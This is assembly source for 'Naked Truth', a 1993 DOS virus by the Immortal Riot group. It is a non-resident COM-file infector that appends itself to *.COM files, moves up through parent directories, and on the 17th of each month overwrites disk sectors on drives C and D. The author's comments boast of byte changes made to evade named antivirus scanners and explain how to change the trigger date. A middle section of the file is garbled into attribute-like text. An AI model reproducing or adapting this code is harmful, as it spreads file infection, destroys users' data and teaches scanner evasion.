

; VirusName : Naked Truth
; Country   : Sweden
; Author    : The Unforiven / Immortal Riot
; Date	    : 17/09/1993
;
; This is a mutation of the virus Born on the Fourth of	July
; This was written by TBSI. Mcafee scan used to find it as the 
; "ash" virus. But I changed on a few bytes, and he's now tricked.
; Dr Alan Salomon "string" where placed at the beginning
; of the code, but now he's cheated too..So...enjoy!
;
; This is a non-overwriting com infector, it is not resident.
; It checks which day it is, and if it is the 17:ten the 
; virus will have a redeeming. A redeeming is very nice.
;
; This might not be the best mutation, but afterall, it
; cheats the most common virus scanners. This was born
; the seventeen of September 1993 (hate all date-names)
;
; Scan v108 can't find this, neither can S&S Toolkit 6.54,
; havn't tried with TBScan/F-Prot, but they will probably
; identify it as the "ash" virus.
;
; Regards : The Unforgiven / Immortal Riot


code segment word public 'code'			; 
assume cs:code,ds:code				; I assume that too :)   
org	100h					; 

main proc;edure					; Old pascal coder ?         


TITLE	Naked Truth				;Mutation Name...   
TOF:						;Top-Of-File
   		jmp	short begin		;Skip over program
  	       	NOP	                        ;Reserve 3rd byte
EOFMARK:	db	26			;Disable DOS's TYPE
		DB	0     ; <- s&s="" toolkit="" "string-cheater".="" first_four:="" nop="" ;first="" run="" copy="" only!="" address:="" int="" 20h="" ;first="" run="" copy="" only!="" check:="" nop="" ;first="" run="" copy="" only!="" begin:="" call="" nextline="" ;push="" bp="" onto="" stack="" nextline:="" pop="" bp="" ;bp="location" of="" skip="" sub="" bp,offset="" nextline="" ;bp="offset" from="" 1st="" run="" mov="" byte="" ptr="" [bp+offset="" infected],0="" ;reset="" infection="" count="" lea="" si,[bp+offset="" first_four]="" ;original="" first="" 4="" bytes="" mov="" di,offset="" tof="" ;tof="" never="" changes="" mov="" cx,4="" ;lets="" copy="" 4="" bytes="" cld="" ;read="" left-to-right="" rep="" movsb="" ;copy="" the="" 4="" bytes="" mov="" ah,1ah="" ;set="" dta="" address="" ...="" lea="" dx,[bp+offset="" dta]="" ;="" ...="" to="" *our*="" dta="" int="" 21h="" ;call="" dos="" to="" set="" dta="" mov="" ah,4eh="" ;find="" first="" asciiz="" lea="" dx,[bp+offset="" immortal]="" ;ds:dx="" -}="" '*.com',0="" lea="" si,[bp+offset="" filename]="" ;point="" to="" file="" push="" dx="" ;save="" dx="" jmp="" short="" continue="" ;continue...="" return:="" mov="" ah,1ah="" ;set="" dta="" address="" ...="" mov="" dx,80h="" ;="" ...="" to="" default="" dta="" int="" 21h="" ;call="" dos="" to="" set="" dta="" xor="" ax,ax="" ;ax="0" mov="" bx,ax="" ;bx="0" mov="" cx,ax="" ;cx="0" mov="" dx,ax="" ;dx="0" mov="" si,ax="" ;si="0" mov="" di,ax="" ;di="0" mov="" sp,0fffeh="" ;sp="0" mov="" bp,100h="" ;bp="100h" (return="" addr)="" push="" bp="" ;="" put="" on="" stack="" mov="" bp,ax="" ;bp="0" ret="" ;jmp="" to="" 100h="" nextfile:="" or="" bx,bx="" ;did="" we="" open="" the="" file?="" jz="" skipclose="" ;no,="" so="" don't="" close="" it="" mov="" ah,3eh="" ;close="" file="" int="" 21h="" ;call="" dos="" to="" close="" it="" xor="" bx,bx="" ;set="" bx="" back="" to="" 0="" skipclose:="" mov="" ah,4fh="" ;find="" next="" asciiz="" continue:="" pop="" dx="" ;restore="" dx="" push="" dx="" ;re-save="" dx="" xor="" cx,cx="" ;cx="0" xor="" bx,bx="" int="" 21h="" ;find="" first/next="" jnc="" skipjmp="" jmp="" noneleft="" ;out="" of="" files="" skipjmp:="" mov="" ax,3d02h="" ;open="" file="" mov="" dx,si="" ;point="" to="" filespec="" int="" 21h="" ;call="" dos="" to="" open="" file="" jc="" nextfile="" ;next="" file="" if="" error="" mov="" bx,ax="" ;get="" the="" handle="" mov="" ah,3fh="" ;read="" from="" file="" mov="" cx,4="" ;read="" 4="" bytes="" lea="" dx,[bp+offset="" first_four]="" ;read="" in="" the="" first="" 4="" int="" 21h="" ;call="" dos="" to="" read="" cmp="" byte="" ptr="" [bp+offset="" check],26="" ;already="" infected?="" je="" nextfile="" ;yep,="" try="" again="" cmp="" byte="" ptr="" [bp+offset="" first_four],77="" ;="" je="" nextfile="" ;="" mov="" ax,4202h="" ;lseek="" to="" eof="" xor="" cx,cx="" ;cx="0" xor="" dx,dx="" ;dx="0" int="" 21h="" ;call="" dos="" to="" lseek="" cmp="" ax,0fd00h="" ;longer="" than="" 63k?="" ja="" nextfile="" ;yep,="" try="" again...="" mov="" [bp+offset="" addr],ax="" ;save="" call="" location="" mov="" ah,40h="" ;write="" to="" file="" mov="" cx,4="" ;write="" 4="" bytes="" lea="" dx,[bp+offset="" first_four]="" ;point="" to="" buffer="" int="" 21h="" ;save="" the="" first="" 4="" bytes="" mov="" ah,40h="" ;write="" to="" file="" mov="" cx,offset="" eof-offset="" begin="" ;length="" of="" target="" code="" lea="" dx,[bp+offset="" begin]="" ;point="" to="" virus="" start="" int="" 21h="" ;append="" the="" virus="" mov="" ax,4200h="" ;lseek="" to="" tof="" xor="" cx,cx="" ;cx="0" xor="" dx,dx="" ;dx="0" int="" 21h="" ;call="" dos="" to="" lseek="" mov="" ax,[bp+offset="" addr]="" ;retrieve="" location="" inc="" ax="" ;adjust="" location="" mov="" [bp+offset="" address],ax="" ;address="" to="" call="" mov="" byte="" ptr="" [bp+offset="" first_four],0e9h="" ;jmp="" rel16="" mov="" byte="" ptr="" [bp+offset="" check],26="" ;eofmark="" mov="" ah,40h="" ;write="" to="" file="" mov="" cx,4="" ;write="" 4="" bytes="" lea="" dx,[bp+offset="" first_four]="" ;4="" bytes="" are="" at="" dx="" int="" 21h="" ;write="" to="" file="" inc="" byte="" ptr="" [bp+offset="" infected]="" ;increment="" counter="" jmp="" nextfile="" ;any="" more?="" noneleft:="" cmp="" byte="" ptr="" [bp+offset="" infected],2="" ;2="" infected="" jae="" theend="" ;party="" over!="" mov="" di,100h="" ;di="100h" cmp="" word="" ptr="" [di],20cdh="" ;an="" int="" 20h?="" je="" daycheck="" ;je="" daycheck="" ;="" ää-äää-ääääääää--ääää--ääääää-äääää--äääääää-ääääää----ääääää-äääää-ääää-="" ;="" here="" instead="" of="" "je"="" to="" theend="" here,="" jump="" to="" daycheck,="" and="" if="" the="" day="" ;="" isn't="" the="" 17:ten,="" just="" continue="" to="" theend,="" but="" if="" it="" is,="" have="" phun...="" ;="" ää-äää-ääääääää--ääää--ääääää-äääää--äääääää-ääääää----ääääää-äääää-ääää-="" lea="" dx,[bp+offset="" riot]="" ;dot-dot="" method..="" ;="" mov="" dx,offset="" riot="" ;shitty="" liner..="" mov="" ah,3bh="" ;set="" current="" directory="" int="" 21h="" ;chdir="" ..="" jc="" theend="" ;we're="" through!="" mov="" ah,4eh="" ;check="" for="" first="" com="" jmp="" continue="" ;start="" over="" in="" new="" dir="" ;="" ää-äää-ääääääää--ääää--ääääää-äääää--äääääää-ääääää----ääääää-äääää-ääää-="" ;="" if="" you="" want="" to="" get="" a="" redeeming="" on="" some="" special="" month,="" just="" look="" at="" the="" ;="" call="" to="" daycheck="" at="" "nonleft"="" and="" the="" call="" to="" daycheck.="" change="" the="" call="" ;="" to="" monthcheck,="" and="" "delete"="" the="" ";"="" on="" procedure="" monthcheck.="" but="" ;="" remember,="" that="" makes,="" the="" virus="" much="" less="" destructive,="" and="" by="" that="" time,="" ;="" all="" scanners="" has="" probably="" added="" a="" new="" scan-string="" on="" this="" one.="" now="" it="" will="" ;="" go="" off="" the="" 17:th="" every="" month.="" feel="" free="" to="" modify="" this="" date="" as="" much="" you="" ;="" want="" to.="" ;="" ää-äää-äääääääää--äää--ääääää-äääää--äääääää-äääääää-ääääääää-äääää-ä-ää-="" ;="" monthcheck:="" ;="" check="" what="" month="" it="" is..="" ;="" mov="" ah,2ah="" ;="" ;="" int="" 21h="" ;="" dos="" to="" your="" service..="" ;="" cmp="" dh,10="" ;="" check="" if="" month="" 10..="" ;="" je="" daycheck="" ;="" if="" yes="" jump="" to="" day="" check="" ;="" jmp="" theend="" ;="" otherwise="" jump="" to="" theend.="" ;="" ää-äää-ääääääää--ääää--ääääää-äääää--äääääää-ääääää----ääääää-äääää-ääää-="" daycheck:="" ;="" check="" what="" day="" it="" is..="" mov="" ah,2ah="" ;="" int="" 21h="" ;="" dos="" to="" your="" service..="" cmp="" dl,17="" ;="" check="" if="" it's="" the="" forbidden="" night..="" je="" redeeming="" ;="" if="" yes,="" have="" a="" great="" fuck..="" jmp="" theend="" ;="" otherwise="" jump="" to="" theend="" redeeming:="" ;="" havi'n="" such="" a="" great="" fuck..="" cli="" ;="" cleaning="" all="" interrupts..="">
	mov	ah,2			; Starting with drive C   
	cwd				; Starting it from 0     
	mov	cx,0100h		; Continue to 256
	int	026h			; Direct disk-write
	jmp	KARO 			; Jump For Joy..(J4J).. 

KARO: 					; Yet another..
	CLI				; No law-breakers here!
	MOV	AL,3			; Set to fry drive D
	MOV	CX,700			; Set to write 700 sectors
	MOV	DX,00			; Starting at sector 0
	MOV	DS,[DI+99]		; Put random crap in DS
	MOV	BX,[DI+55]		; More crap in BX
	CALL	REDEEMING		; Start it all over..

TheEnd:		jmp	return          ; Getting a gold medal ?            

Immortal:	db	'*.COM',0    	;File Specification
Riot:   	db	'..',0		;'Dot-Dot'     

MutationName:	db	" Naked Truth! "  
Sizefilling:	db	" Hi-Tech Assasins - Ready To Take On The World "
morefilling:	db	" // DEATH TO ALL - PEACE AT LAST // "
Copyleft:     	db	' The Unforgiven / Immortal Riot '        


; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
; None of this information is included in the virus's code.  It is only
; used during the search/infect routines and it is not necessary to pre-
; serve it in between calls to them.
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-

EOF:						;End Of File..
DTA:		db	21 dup (?)		;internal search's data

attribute	db	?			;attribute
file_time	db	2 dup (?)		;file's time stamp
file_date	db	2 dup (?)		;file's date stamp
file_size	db	4 dup (?)		;file's size
filename	db	13 dup (?)		;filename

infected	db	?			;infection count

addr		dw	?			;Address

main endp;rocedure
code ends;egment

end main

; Greets goes out to : Raver, Metal Militia, Scavenger
; and all other	hi-tech assasins all over the world...
</->